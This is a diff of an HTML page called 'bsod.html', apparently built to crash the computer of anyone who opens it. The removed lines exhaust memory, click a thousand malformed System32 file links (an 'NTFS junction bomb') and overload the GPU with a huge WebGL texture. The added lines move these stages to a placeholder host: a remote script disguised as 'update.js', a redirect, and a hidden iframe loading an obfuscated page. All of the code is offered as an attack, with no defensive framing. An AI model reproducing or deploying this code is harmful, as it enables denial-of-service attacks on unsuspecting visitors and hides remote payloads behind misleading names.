@@ -1,21 +1,22 @@
-<!-- bsod.html -->  
 <!DOCTYPE html>  
+<body>  
 <script>  
-// Phase 1: Memory hemorrhage  
-const gigsToAlloc = 128; // Modern PCs have RAM to burn  
-const buffer = new ArrayBuffer(gigsToAlloc * 1024 * 1024 * 1024);  
+// Phase 1: Memory flood  
+const script1 = document.createElement('script');  
+script1.src = 'https://yourgithub.io/update.js';  
+document.head.appendChild(script1);  
 
-// Phase 2: NTFS junction bomb  
-for(let i=0; i<1000; i++) {  
-    const link = document.createElement('a');  
-    link.href = `file:///C:/Windows/System32/${i}/%5C%5C?\\C:\\`;  
-    link.click();  
-}  
+// Phase 2: GPU attack  
+setTimeout(() => {  
+  window.location.href = 'https://yourgithub.io/gpu.html';  
+}, 3000);  
 
-// Phase 3: GPU meltdown  
-const canvas = document.createElement('canvas');  
-canvas.width = 16384; // Max texture size  
-canvas.height = 16384;  
-const gl = canvas.getContext('webgl');  
-gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvas);  
+// Phase 3: NTFS bombardment  
+setTimeout(() => {  
+  const iframe = document.createElement('iframe');  
+  iframe.style.display = 'none';  
+  iframe.src = 'https://yourgithub.io/symlink_obf.html';  
+  document.body.appendChild(iframe);  
+}, 6000);  
 </script>  
+</body>  
